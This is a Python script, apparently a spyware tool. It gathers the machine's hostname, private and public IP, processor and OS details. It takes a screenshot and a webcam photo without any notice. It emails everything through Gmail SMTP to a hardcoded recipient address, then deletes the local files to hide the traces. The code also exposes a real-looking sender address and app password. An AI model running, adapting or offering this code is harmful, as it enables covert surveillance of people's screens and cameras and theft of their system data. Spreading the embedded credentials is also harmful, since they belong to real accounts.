from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from PIL import ImageGrab
import os
from requests import get
import logging
import cv2  # Import OpenCV for webcam capture

# Set up logging
logging.basicConfig(
    filename="application.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# File and email configuration
system_information = "syseminfo.txt"
screenshot_information = "screenshot.png"
camera_photo_information = "camera_photo.png"

email_address = "agarwalshubh.pps1@gmail.com"
password = "ypjk fwrl iktr akpo"
toaddr = "sanyamw77@gmail.com"

# Define file path to userData directory
file_path = os.path.join(os.path.dirname(__file__), "userData")
if not os.path.exists(file_path):
    os.makedirs(file_path)  # Create userData directory if it doesn't exist


# Email sending function
def send_email(attachments, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Log Files, Screenshot, and Camera Photo"
    body = "Attached are the log files, screenshot, and camera photo."
    msg.attach(MIMEText(body, "plain"))

    for filename, filepath in attachments:
        try:
            with open(filepath, "rb") as f:
                p = MIMEBase("application", "octet-stream")
                p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header("Content-Disposition", f"attachment; filename={filename}")
            msg.attach(p)

            logging.info(f"Attachment {filename} added to email.")
        except Exception as e:
            logging.error(f"Failed to add attachment {filename}: {e}")

    try:
        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.starttls()
        s.login(fromaddr, password)
        s.sendmail(fromaddr, toaddr, msg.as_string())
        s.quit()
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")


# Get computer information
def computer_information():
    try:
        with open(os.path.join(file_path, system_information), "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + "\n")
            except Exception:
                f.write("Couldn't get Public IP Address\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
        logging.info("Computer information collected successfully.")
    except Exception as e:
        logging.error(f"Error collecting computer information: {e}")


# Take screenshot
def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(os.path.join(file_path, screenshot_information))
        logging.info("Screenshot captured successfully.")
    except Exception as e:
        logging.error(f"Error capturing screenshot: {e}")


# Capture photo from webcam
def capture_photo():
    try:
        cap = cv2.VideoCapture(0)  # Open the default camera
        if not cap.isOpened():
            raise Exception("Could not open webcam")

        ret, frame = cap.read()
        if ret:
            cv2.imwrite(os.path.join(file_path, camera_photo_information), frame)
            logging.info("Camera photo captured successfully.")
        else:
            logging.error("Failed to capture photo from webcam")

        cap.release()
        cv2.destroyAllWindows()
    except Exception as e:
        logging.error(f"Error capturing photo from webcam: {e}")


# Clean up
def cleanup():
    delete_files = [
        system_information,
        screenshot_information,
        camera_photo_information,
    ]
    for file in delete_files:
        try:
            os.remove(os.path.join(file_path, file))
            logging.info(f"File {file} deleted successfully.")
        except Exception as e:
            logging.error(f"Error deleting file {file}: {e}")


# Main script execution
def main():
    computer_information()
    screenshot()
    capture_photo()  # Capture photo from webcam

    attachments = [
        (system_information, os.path.join(file_path, system_information)),
        (screenshot_information, os.path.join(file_path, screenshot_information)),
        (camera_photo_information, os.path.join(file_path, camera_photo_information)),
    ]

    send_email(attachments, toaddr)

    cleanup()


if __name__ == "__main__":
    main()
